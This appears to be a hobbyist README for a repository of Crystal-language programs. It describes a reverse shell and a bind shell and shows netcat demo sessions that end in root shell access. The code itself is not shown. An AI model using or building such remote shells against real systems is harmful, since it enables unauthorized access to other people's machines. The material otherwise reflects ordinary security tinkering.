# crystalmeth
experiments with "crystal" language. As I faff with it I'll upload small programs here with some semblance of documentation. 

The docs for the lang are on the site: https://crystal-lang.org/

## backconnect.cr  
It is a reverse shell. 

Linux only (because I cheated and used syscalls for the dup2 part) reverse shell. Once I can be fucked, I'll fix it so it works properly on other platforms.

Demo:  
I mean. It is the most basic reverse shell. 
```
# crystal run backconnect.cr
(nothing happens)
--
attacker:~$  nc -lvp 42069
listening on [any] 42069 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 35216
id
uid=0(root) gid=0(root) groups=0(root)
exit
```

## bindport.cr
Linux only (because I cheated and used syscalls for the dup2 part) bind shell. Once I can be fucked, I'll fix it so it works properly on other platforms.

Demo:  
I mean. It is the most basic bind shell. 

```
# crystal run bindport.cr
(nothing happens)
--
$ nc -v 127.0.0.1 42069
localhost [127.0.0.1] 42069 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
```
